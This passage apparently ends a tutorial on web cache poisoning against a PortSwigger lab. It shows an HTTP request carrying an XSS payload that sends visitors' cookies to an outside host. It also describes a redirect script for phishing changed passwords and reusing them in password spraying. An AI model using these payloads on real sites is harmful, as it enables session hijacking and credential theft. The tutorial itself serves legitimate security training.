<pre id="bkmrk-get-%2Fdashboard-http%2F"><code class="language-Lua">GET /dashboard HTTP/1.1
Host: acb71fdd1e124550803245dc009d00fe.web-security-academy.net
X-Original-Url: /search?q=&lt;img src=x onerror=this.src='https://hideandsec.sh/?c='+document.cookie /&gt;</code></pre>
<p id="bkmrk-si-le-serveur-n%E2%80%99acce"><span style="font-weight: 400;">If the server does not accept this request, encode it, or even </span><span style="text-decoration: underline;"><a href="https://owasp.org/www-community/Double_Encoding" target="_blank" rel="noopener"><span style="font-weight: 400; color: #00ccff; text-decoration: underline;">encode it twice</span></a></span><span style="font-weight: 400;">.</span></p>
<p id="bkmrk-dans-cette-requ%C3%AAte%2C-"><span style="font-weight: 400;">In this request, the server will return the search result with our image <code>&lt;img src=x onerror=this.src='https://hideandsec.sh/?c='+document.cookie /&gt;</code></span><span style="font-weight: 400;"><br></span><span style="font-weight: 400;">Once the content of the page is cached, anyone trying to go to their <strong>/dashboard</strong> will end up on the search page, with our image that they will not be able to load, by sending their cookies.<br>We use the <strong>/dashboard</strong> here and not the home page, to be sure to retrieve cookies from people who are logged in.</span></p>
<p id="bkmrk-on-aurait-tr%C3%A8s-bien-"><span style="font-weight: 400;">We could have also redirected the <span style="color: #00ccff;">/change_password</span> to ours with </span><code>&lt;script&gt;window.location.replace("https://hideandsec.sh/change_password");&lt;/script&gt;</code><span style="font-weight: 400;">, and redo phishing like the <strong>Open Redirection</strong>.<br></span><span style="font-weight: 400;">If the victim doesn't pay attention to the domain name that has changed in the meantime, we could recover 2 passwords from the victim, the old one and the new one, which we can then use for <span style="text-decoration: underline;"><a href="https://resources.infosecinstitute.com/password-spraying/"><span style="color: #00ccff; text-decoration: underline;">Password Spraying</span></a></span>.</span></p>
<hr id="bkmrk--6"><h4 id="bkmrk-%C2%A0-0">Author</h4>
<h5 id="bkmrk-mxrch">mxrch</h5>
<ul id="bkmrk-site-%3A-https%3A%2F%2Fmxrch"></li>
<li>Github : <a href="https://github.com/mxrch">https://github.com/mxrch</a></li><li>Twitter : <a href="https://twitter.com/mxrchreborn">https://twitter.com/mxrchreborn</a></li>
<li>HackTheBox : <a href="https://www.hackthebox.eu/profile/181024">https://www.hackthebox.eu/profile/181024</a></li>
</ul><h4 id="bkmrk-contributeurs">Contributor</h4>
<h5 id="bkmrk-tartofraise">Tartofraise</h5>
<div id="bkmrk-hackthebox-%3A-https%3A%2F">
<div aria-label="Actions des messages">
<div>
<ul><li aria-label="Plus" aria-controls="popout_14103" aria-expanded="false">Github : <a href="https://github.com/Tartofraise">https://github.com/Tartofraise</a></li><li aria-label="Plus" aria-controls="popout_14103" aria-expanded="false">Twitter : <a href="https://twitter.com/_Tartofraise">https://twitter.com/_Tartofraise</a></li><li aria-label="Plus" aria-controls="popout_14103" aria-expanded="false">HackTheBox : <a href="https://www.hackthebox.eu/home/users/profile/103958">https://www.hackthebox.eu/home/users/profile/103958</a></li>
</ul></div>
</div>
</div>
